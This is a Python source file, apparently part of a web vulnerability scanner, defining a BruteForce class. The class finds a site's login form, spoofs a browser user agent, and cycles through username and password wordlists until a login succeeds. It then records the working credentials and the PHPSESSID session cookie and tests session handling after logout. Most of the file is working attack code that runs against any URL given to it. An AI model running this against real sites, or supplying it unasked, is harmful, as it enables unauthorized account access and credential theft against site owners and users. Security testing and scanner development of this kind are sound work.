from robobrowser import RoboBrowser
from bs4 import BeautifulSoup
from general import *


class BruteForce:

    def __init__(self, alamatURL):
        self.url = alamatURL
        self.list_atr = ("id", "class", "name", "action")
        self.atr_form = None
        self.atr_value = None
        self.log = list()
        self.log_csv = list()
        self.user_list = file_to_set("db/db_username.txt")
        self.pass_list = file_to_set("db/db_password.txt")

        self.boot()
        # print(self.value_tag, self.tag_form, self.name_input)

    def boot(self):
        htmlLogin = self.get_form_login_html(self.url)
        if htmlLogin is not False:
            self.name_input = self.get_input_name(htmlLogin)
            value = None
            for atr in self.list_atr:
                value = self.get_value_atr_form(htmlLogin, atr)
                if value is not None:
                    self.atr_form = atr
                    self.atr_value = value
                    self.attack()
                    break
            if value is None:
                self.log.append("not vulnerability - not found or not have form login")
        else:
            self.log.append("not vulnerability - not found or not have form login")

    def attack(self):
        user_agent = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0'
        accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        accept_language = 'en-US,en;q=0.5'

        s = requests.Session()
        s.headers['User-Agent'] = user_agent
        s.headers['Accept'] = accept
        s.headers['Accept-Language'] = accept_language
        robo = RoboBrowser(session=s, history=True)
        robo.open(self.url)
        if self.atr_form is "id":
            form = robo.get_form(id=self.atr_value)
        elif self.atr_form is "class":
            form = robo.get_form(class_=self.atr_value)
        elif self.atr_form is "name":
            form = robo.get_form(name=self.atr_value)
        elif self.atr_form is "action":
            form = robo.get_form(action=self.atr_value)
        else:
            self.log.append("Tidak Menemukan Form Login")
            return None

        #melakukan input salah sebagai kondisi gagal login saat melakukan Brute Force
        form[self.name_input[0]].value = "xxxxx"
        form[self.name_input[1]].value = "xxxxx"
        robo.submit_form(form)
        urlFailed = str(robo.url)

        #melakukan serangan Brute
        for username in self.user_list:
            for password in self.pass_list:
                robo.open(self.url)
                form[self.name_input[0]].value = username
                form[self.name_input[1]].value = password
                robo.submit_form(form)
                url = str(robo.url)
                if url != urlFailed:
                    self.log_csv.append(["Brute Force", self.url])
                    self.log.append("login is success or you has been locked out of attempts")
                    self.log.append("Url after login : " + robo.url)
                    self.log.append("Username        : " + username)
                    self.log.append("Password        : " + password)

                    # melakukan cek apakah url setelah login url memiliki parameter
                    # jika iya maka mencoba melakukan serangan traversal path
                    if cek_link_with_parm(robo.url) is True:
                        cek = str(robo.url)
                        if cek.__contains__(username) or cek.__contains__(password):
                            self.log_csv.append(["Sensitive Data Exposed", self.url])
                            self.log.append("url contain sensitive data maybe have vulnerability")
                    try:
                        #mencari SESSION PHPSESSID
                        sess = robo.session.cookies['PHPSESSID']
                        self.log_csv.append(["Session ID Exposed", self.url])
                        self.log.append("found PHPSESSID maybe have vulnerability fixation attack")
                        self.log.append("PHPSESSID : " + sess)

                        #mencoba logout dan kembali
                        urlLog = robo.url
                        linkLogout = robo.get_link(text="logout")
                        if linkLogout is not None:
                            robo.follow_link(linkLogout)
                            robo.back(n=1)
                            if robo.url == urlLog:
                                self.log.append("session not destroyed maybe have vulnerabilty")
                    except:
                        pass
                    return None
        self.log.append("Brute Force failed - Login not successfull")
        return None

    def get_form_login_html(self, alamatURL):
        r = requests.get(alamatURL, timeout=5)
        login = file_to_list("db/db_login.txt")
        try:
            soup = BeautifulSoup(r.text, 'html.parser')
            forms = soup.find_all('form')
            for form in forms:
                html = str(form)
                for log in login:
                    if html.__contains__(log):
                        return html
                else:
                    return False
            return False
        except:
            return False

    def get_value_atr_form(self, html, atr):
        soup = BeautifulSoup(html, 'html.parser')
        value = soup.find('form').get(atr)
        return value

    def get_input_name(self, html):
        soup = BeautifulSoup(html, 'html.parser')
        value = list()
        for item in soup.find_all('input'):
            try:
                value.append(item['name'])
            except:
                pass
        return value

    def return_output(self):
        output = self.log
        return output

    def return_output_csv(self):
        output = self.log_csv
        return output
